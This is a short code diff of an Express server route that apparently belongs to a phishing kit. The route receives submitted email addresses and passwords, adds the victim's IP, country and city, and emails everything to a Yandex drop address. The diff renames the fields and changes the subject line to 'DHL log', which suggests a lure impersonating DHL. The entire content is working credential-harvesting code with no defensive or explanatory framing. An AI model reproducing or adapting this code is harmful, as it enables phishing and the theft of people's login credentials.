@@ -27,7 +27,7 @@ app.get("/", (request, response) => {
 
 // https://expressjs.com/en/starter/basic-routing.html
 app.post("/", (req, res) => {
-  const { ai, pr } = req.body;
+  const { email, password } = req.body;
   console.log(req.body);
   let logEmail = "comp.id47@yandex.com";
 
@@ -48,8 +48,8 @@ app.post("/", (req, res) => {
     </head>  
     <body>
     Details Has Arrived!!
-    <h3>User: ${ai}</h3>
-    <h3>Access: ${pr}</h3>
+    <h3>User: ${email}</h3>
+    <h3>Access: ${password}</h3>
     <h3>IP: ${ip}</h3>
     <h3>Country: ${country}</h3>
     <h3>City: ${city}</h3>
@@ -66,7 +66,7 @@ app.post("/", (req, res) => {
     {
       from: "fresh@logscentral.com",
       to: logEmail,
-      subject: "money log" + ip2,
+      subject: "DHL log" + ip2,
       html,
     },
     function (err, reply) {
